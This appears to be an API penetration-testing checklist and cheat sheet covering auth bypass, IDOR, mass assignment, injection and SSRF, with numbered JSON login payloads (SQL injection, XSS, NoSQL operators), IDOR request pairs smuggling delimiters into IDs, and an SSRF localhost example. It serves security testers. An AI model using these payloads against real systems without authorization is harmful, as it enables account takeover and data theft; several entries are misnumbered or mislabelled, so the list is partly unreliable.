
##  Goal:
Identify common API endpoints and data points where attacker-controlled input can lead to vulnerabilities such as auth bypass, BOLA, mass assignment, IDOR, SSRF, injection, and misconfigurations.

---

## Authentication / Authorization Issues
- [ ] `Authorization: Bearer <user-controlled>` header
- [ ] `X-API-Key` header from public/front-end client
- [ ] Token included in query string: `?token=abc123`
- [ ] OTP or 2FA code submission endpoints
- [ ] Device registration endpoints: `/api/device/register`
- [ ] Login endpoints accepting only user ID (no password)
- [ ] Publicly exposed introspection endpoints (`/me`, `/validate-token`)
- [ ] Password reset token validation endpoint
- [ ] Access-control bypass via method spoofing (`X-HTTP-Method-Override`)
- [ ] Missing `scope` validation in OAuth token exchange

---

## BOLA / IDOR (Broken Object Level Auth)
- [ ] Path parameter injection: `/api/users/{userId}`
- [ ] Resource-based access: `/orders/{orderId}`, `/invoices/{invoiceId}`
- [ ] Changing `account_id` or `user_id` in body or query
- [ ] Replacing object references in PATCH/PUT/DELETE requests
- [ ] Accessing `GET /files/{filename}` or `/documents/{docId}`
- [ ] GraphQL: Querying objects by ID directly `{ user(id: 5) }`
- [ ] Bypassing RBAC with elevated `role=admin` in body
- [ ] Modifying nested objects in JSON (e.g., `"owner":{"id":2}`)
- [ ] Using predictable sequential resource IDs
- [ ] Caching leaks due to resource-based URLs

---

## Mass Assignment / Overposting
- [ ] Extra fields in POST/PUT/PATCH JSON body
- [ ] Sending `is_admin`, `role`, `access_level` in user registration
- [ ] Modifying server-controlled flags: `"verified": true`
- [ ] `user_id`, `tenant_id`, `company_id` fields in nested JSON
- [ ] GraphQL mutation abusing nested input: `{ updateUser(input: { admin: true }) }`
- [ ] Bypassing frontend-restricted fields with direct API call
- [ ] Ignored field names reused for privilege escalation
- [ ] Modifying soft-deleted records via undeclared fields
- [ ] Input fields not whitelisted by backend serializer
- [ ] Supplying foreign keys not authorized to user

---

## Injection Points (SQLi, NoSQLi, CMDi)
- [ ] Filter/search parameters: `?filter=name`, `?search=query`
- [ ] POST body fields passed directly to queries
- [ ] Sort/order fields (`?sort=id`, `?order=asc`)
- [ ] GraphQL filter injection: `{ users(where: {name_contains: "..."}) }`
- [ ] gRPC Protobuf fields deserialized insecurely
- [ ] Query builders taking raw user input (like Sequelize or Mongoose)
- [ ] Headers processed dynamically: `X-User-ID`, `X-Forwarded-For`
- [ ] Unescaped input used in dynamic routing
- [ ] Fields that control database queries like `column`, `table`, etc.
- [ ] API gateway parsing input for backend SQL query strings

---

## SSRF / External Interaction Vectors
- [ ] `url=` parameter in query or body for import/upload
- [ ] File fetchers or renderers accepting external URLs
- [ ] GraphQL with URL input: `{ fetch(url: "http://...") }`
- [ ] Image preview/render endpoints (`/api/preview?src=http...`)
- [ ] PDF or file generation services with external input

---

## Miscellaneous API-Specific Vectors
- [ ] API versioning path: `/v1/`, `/v2/` — unauthenticated legacy endpoints
- [ ] Rate limit testing: brute-forcing through `/api/login`
- [ ] Content-Type abuse: `Content-Type: text/xml`, `multipart/form-data`
- [ ] Method confusion via CORS preflight bypass (`OPTIONS`, `PUT`, etc.)
- [ ] Unfiltered object expansion (`include=comments.user.profile`)

---

## Payload Examples
- [ ] `/api/users/1337` → modify to test IDOR
- [ ] `{"admin":true,"role":"superadmin"}` → mass assignment
- [ ] `?filter=1'--` → SQLi
- [ ] `url=http://127.0.0.1:8080` → SSRF
- [ ] `Authorization: Bearer malformed.jwt.token` → token parsing issues

---

97 JSON Tests for for Authentication Endpoints link pdf [link](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)

1. Basic credentials
```
{
"login": "admin",
"password": "admin"
}
```

2. Empty credentials:
```
{
"login": "",
"password": ""
}
```

3- Null values:
```
{
"login": null,
"password": null
}
```

4. Credentials as numbers:
```
{
"login": 123,
"password": 456
}
```

6. Credentials as booleans:
```
{
"login": true,
"password": false
}
```

7. Credentials as arrays:
```
{
"login": ["admin"],
"password": ["password"]
}
```

8. Credentials as objects:
```
{
"login": {"username": "admin",
"password": {"password": "password"}}
}
```

9. Special characters in credentials:
```
{
"login": "@dm!n",
"password": "p@ssw0rd#"
}
```

10. SQL Injection:
```
{
"login": "admin' --",
"password": "password"
}
```

11. HTML tags in credentials:
```
{
"login": "<h1>admin</h1>",
"password": "ololo-HTML-XSS"
}
```

12. Unicode in credentials:
```
{
"login": "\u0061\u0064\u006D\u0069\u006E",
"password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"
}
```

13. Credentials with escape characters:
```
{
"login": "ad\\nmin",
"password": "pa\\ssword"
}
```

14. Credentials with white space:
```
{
"login": " ",
"password": " "
}
```

15. Overlong values:
```
{
"login": "a"*10000,
"password": "b"*10000
}

```
16. Malformed JSON (missing brace):
```
{
"login": "admin",
"password": "admin"
}
```

17. Malformed JSON (extra comma):
```
{
"login": "admin",
"password": "admin",
}
```

18. Missing login key:
```
{
"password": "admin"
}
```

19. Missing password key:
```
{
"login": "admin"
}
```

20. Swapped key values:
```
{
"admin": "login",
"password": "password"
}
```

21. Extra keys:
```
{
"login": "admin",
"password": "admin",
"extra": "extra"
}
```

22. Missing colon:
```
{
"login" "admin",
"password": "password"
}
```

23. Invalid Boolean as credentials:
```
{
"login": yes,
"password": no
}
```

25. All keys, no values:
```
{
"": "",
"": ""
}
```

26. Nested objects:
```
{
"login": {"innerLogin": "admin",
"password": {"innerPassword": "password"}}
}
```
27. Case sensitivity testing:
```
{
"LOGIN": "admin",
"PASSWORD": "password"
}
```

28. Login as a number, password as a string:
```
{
"login": 1234,
"password": "password"
}
```

29. Login as a string, password as a number:
```
{
"login": "admin",
"password": 1234
}
```

30. Repeated keys:
```
{
"login": "admin",
"login": "user",
"password": "password"
}
```
31. Single quotes instead of double:
```
{
'login': 'admin',
'password': 'password'
}
```
33. Login and password with only special characters:
```
{
"login": "@#$%^&*",
"password": "!@#$%^&*"
}
```
34. Unicode escape sequence:
```
{
"login": "\u0041\u0044\u004D\u0049\u004E",
"password":"\u0050\u0041\u0053\u0053\u0057\u004F\u0052\u0044"
}
```

35. Value as object instead of string:
```
{
"login": {"$oid":
"507c7f79bcf86cd7994f6c0e"},
"password": "password"}
}
```

37. Nonexistent variables as values:
```
{
"login": undefined,
"password": undefined
}
```

38. Extra nested objects:
```
{
"login": "admin",
"password": "password",
"extra": {"key1": "value1",
"key2": "value2"}
}

```

39. Hexadecimal values:
```
{
"login": "0x1234",
"password": "0x5678"
}
```

40. Extra symbols after valid JSON:
```
{
"login": "admin",
"password": "password"}@@@@@@
}
```

41. Only keys, without values:
```
{
"login":,
"password":
}
```

42. Insertion of control characters:
```
{
"login": "ad\u0000min",
"password": "pass\u0000word"
}
```

43. Long Unicode Strings:
```
{
"login": "\u0061"*10000,
"password": "\u0061"*10000
}
```

44. Newline Characters in Strings:
```
{
"login": "ad\nmin",
"password": "pa\nssword"
}
```

45. Tab Characters in Strings:
```
{
"login": "ad\tmin",
"password": "pa\tssword"
}
```

46. Test with HTML content in Strings:
```
{
"login": "<b>admin",
"password": "password"
}
```

47. JSON Injection in Strings:
```
{
"login": "{\"injection\":\"value\"}",
"password": "password"
}
```

48. Test with XML content in Strings:
```
{
"login": "admin",
"password": "password"
}
```

49. Combination of Number, Strings, and Special characters:
```
{
"login": "ad123min!@",
"password": "pa55w0rd!@"
}
```

50. Use of environment variables:
```
{
"login": "${USER}",
"password": "${PASS}"
}
```

51. Backslashes in Strings:
```
{
"login": "ad\\min",
"password": "pa\\ssword"
}
```

52. Long strings of special characters:
```
{
"login": "!@#$%^&*()"*1000,
"password": "!@#$%^&*()"*1000
}
```

53. Empty Key in JSON:
```
{
"": "admin",
"password": "password"
}
```

55. JSON Injection in Key:
```
{
"{\"injection\":\"value\"}
": "admin",
"password": "password"
}
```

56. Quotation marks in strings:
```
{
"login": "\"admin\"",
"password": "\"password\""
}
```

57. Credentials as nested arrays:
```
{
"login": [["admin"]],
"password": [["password"]]
}
```

58. Credentials as nested objects:
```
{
"login": {"username": {"value": "admin",
"password": {"password": {"value":
"password"
}
```

59. Keys as numbers:
```
{
123: "admin",
456: "password"
}
```

60. Testing with greater than and less than signs:
```
{
"login": "admin>1",
"password": "<password"
}
```

61. Testing with parentheses in credentials:
```
{
"login": "(admin)",
"password": "(password)"
}
```

62. Credentials containing slashes:
```
{
"login": "admin/user",
"password": "pass/word"
}
```

63. Credentials containing multiple data types:
```
{
"login": ["admin",
123,
true,
null,
{"username": ["admin"],
"password": ["password",
123,
false,
null,
{"password": "password"]}}
}
```

64. Using escape sequences:
```
{
"login": "admin\\r\\n\\t",
"password": "password\\r\\n\\t"
}
```

65. Using curly braces in strings:
```
{
"login": "{admin}",
"password": "{password}"
}
```

66. Using square brackets in strings:
```
{
"login": "[admin]",
"password": "[password]"
}
```

68. Strings with only special characters:
```
{
"login": "!@#$$%^&*()",
"password": "!@#$$%^&*()"
}
```

69. Strings with control characters:
```
{
"login": "admin\b\f\n\r\t\v\0",
"password": "password\b\f\n\r\t\v\0"
}
```

71. Null characters in strings:
```
{
"login": "admin\0",
"password": "password\0"
}
```

72. Exponential numbers as strings:
```
{
"login": "1e5",
"password": "1e10"
}
```

73. Hexadecimal numbers as strings:
```
{
"login": "0xabc",
"password": "0x123"
}
```

74. Leading zeros in numeric strings:
```
{
"login": "000123",
"password": "000456"
}
```

75. Multilingual input (here, English and Korean):
```
{
"login": "adminê´€ë¦¬ìž",
"password": "passwordë¹„ë°€ë²ˆí˜¸"
}
```
76. Extremely long keys:
```
{
"a"*10000: "admin",
"b"*10000: "password"
}
```

78. Extremely long unicode strings:
```
{
"login": "\u0061"*10000,
"password": "\u0062"*10000
}
```

79. JSON strings with semicolon:
```
{
"login": "admin;",
"password": "password;"
}
```

80. JSON strings with backticks:
```
{
"login": "`admin`",
"password": "`password`"
}
```

81. JSON strings with plus sign:
```
{
"login": "admin+",
"password": "password+"
}
```

82. JSON strings with equal sign:
```
{
"login": "admin=",
"password": "password="
}
```
83. Strings with Asterisk (*) Symbol:
```
{
"login": "admin*",
"password": "password*"
}
```

84. JSON containing JavaScript code:
```
{
"login": "admin<script>alert('hi')</script>",
"password": "password"
}
```

85. Negative numbers as strings:
```
{
"login": "-123",
"password": "-456"
}
```

86. Values as URLs:
```
{
"login": "https://admin.com",
"password": "https://password.com"
}
```

87. Strings with email format:
```
{
"login": "admin@admin.com",
"password": "password@password.com"
}
```
88. Strings with IP address format:
```
{
"login": "192.0.2.0",
"password": "203.0.113.0"
}
```

89. Strings with date format:
```
{
"login": "2023-08-03",
"password": "2023-08-04"
}
```

90. JSON with exponential values:
```
{
"login": 1e+30,
"password": 1e+30
}
```

91. JSON with negative exponential values:
```
{
"login": -1e+30,
"password": -1e+30
}
```

92. Using Zero Width Space (U+200B) in strings:
```
{
"login": "adminâ€‹",
"password": "passwordâ€‹"
}
```

93. Using Zero Width Joiner (U+200D) in strings:
```
{
"login": "adminâ€",
"password": "passwordâ€"
}
```

94. JSON with extremely large numbers:
```
{
"login": 12345678901234567890,
"password": 12345678901234567890
}
```

95. Strings with backspace characters:
```
{
"login": "admin\b",
"password": "password\b"
}
```

96. Test with emoji in strings:
```
{
"login": "adminðŸ˜€",
"password": "passwordðŸ˜€"
}
```

97. JSON with comments, although they are not officially supported in JSON:
```
{
/*"login": "admin",
"password": "password"*/
}
```

98. JSON with base64 encoded values:
```
{
"login": "YWRtaW4=",
"password": "cGFzc3dvcmQ="
}
```

99. Including null byte character (may cause truncation):
```
{
"login": "admin\0",
"password": "password\0"
}
```

100. JSON with credentials in scientific notation:
```
{
"login": 1e100,
"password": 1e100
}
```

102. Strings with octal values:
```
{
"login": "\141\144\155\151\156",
"password":"\160\141\163\163\167\157\162\144"
}
```
103. writeup
```
{
root:{
"username": "admin",
"password":"admin"
}
}
```

104. writeup
```
basic => username=admin
username[]=admin
username[0]=admin
username=admin&username=admin
delete username=admin

```
---

**Predictable ID**
```bash
GET /api/v1/account/**2222** 
Token: UserA_token

GET /api/v1/account/**3333** 
Token: UserA_token
```

**ID combo**
```bash
GET /api/v1/**UserA**/data/2222 
Token: UserA_token

GET /api/v1/**UserB**/data/3333 
Token: UserA_token
```

**Integer as ID**
```bash
POST /api/v1/account/ 
Token: UserA_token 
{"Account": 2222 }


POST /api/v1/account/ 
Token: UserA_token 
{"Account": [3333]}
```

**Email as user ID**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserA@email.com"}


POST /api/v1/user/account 
Token: UserA_token 
{"email": " UserB@email.com"}
```

**Group ID**
```bash
GET /api/v1/group/CompanyA 
Token: UserA_token

GET /api/v1/group/CompanyB
Token: UserA_token
```

**Group and user combo**
```bash
POST /api/v1/group/CompanyA 
Token: UserA_token 
{"email": " userA@CompanyA .com"}

POST /api/v1/group/CompanyB 
Token: UserA_token 
{"email": " userB@CompanyB .com"}
```

**Nested object**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": {"Account" :3333}}
```

**Multiple objects**
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222, "Account": 3333, "Account": 5555 }
```

**Predictable token**
```bash
POST /api/v1/user/account 
Token: UserA_token 
{"data": "DflK1df7jSdfa1acaa"}

POST /api/v1/user/account
Token: UserA_token 
{"data": "DflK1df7jSdfa2dfaa"}
```

10-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d%0a1111 }
```

11-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a1111 }
```

12-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0d1111 }
```

13-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%001111 }
```

14-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": [2222,1111] }
```


15-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222;1111 }
```


16-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222,1111 }
```

17-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222|1111 }
```

18-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222%0a%0dcc:1111 }
```

19-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222&1111 }
```

20-method
```bash
POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222 }

POST /api/v1/user/checking 
Token: UserA_token 
{"Account": 2222#%1111 }
```
---

## API Security

- API Security
    - 31 Days of API Security Testing
        - [ ]  To change versions: `api/v3/login` → `api/v1/login`
        - [ ]  Check other AuthN endpoints: `/api/mobile/login` → `/api/v3/login` `/api/magic_link`
        - [ ]  Verb Tampering: `GET /api/trips/1` → `POST /api/trips/1` `POST /api/trips` `DELETE /api/trips/1`
        - [ ]  Try Object IDs in HTTP headers and bodies, URLs tend to be less vulnerable.
        - [ ]  Try Numeric IDs when facing a GUID/UUID: `GET /api/users/6b95d962-df38` → `GET /api/users/1`
        - [ ]  Wrap ID with an array: `{"id":111}` → `{"id":[111]}`
        - [ ]  Wrap ID with a JSON object: `{"id":111}` → `{"id":{"id":111}}`
        - [ ]  HTTP Parameter Pollution: `/api/profile?user_id=legit&user_id=victim` `/api/profile?user_id=victim&user_id=legit`
        - [ ]  JSON Parameter Pollution: `{"user_id":legit,"user_id":victim}` `{"user_id":victim,"user_id":legit}`
        - [ ]  Wildcard instead of ID: `/api/users/1` → `/api/users/*` `/api/users/%` `/api/users/_` `/api/users/.`
        - [ ]  Ruby application HTTP parameter containing a URL → Pipe as the first character and then a shell command.
        - [ ]  Developer APIs differs with mobile and web APIs. Test them separately.
        - [ ]  Change Content-Type to `application/xml` and see if the API parse it.
        - [ ]  Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.
        - [ ]  Export Injection if you see `Convert to PDF` feature.
        - [ ]  Expand your attack surface and test old versions of [APKs](https://apkpure.com) IPAs.
    
    - Misc

        - Check different `Content-Types`

        ```
        x-www-form-urlencoded --> user=test
        application/json --> {"user": "test"}
        application/xml --> <user>test</user>**
        ```

        - If it's regular POST data try sending arrays, dictionaries

        ```
        username[]=John
        username[$neq]=lalala**
        ```

        - If JSON is supported try to send unexpected data types

        ```
        {"username": "John"}
        {"username": true}
        {"username": null}
        {"username": 1}
        {"username": [true]}
        {"username": ["John", true]}
        {"username": {"$neq": "lalala"}}**
        ```

        - If XML is supported, check for XXE



### References:
* https://github.com/inonshk/31-days-of-API-Security-Tips
* https://book.hacktricks.xyz/pentesting/pentesting-web/api-pentesting
* https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.md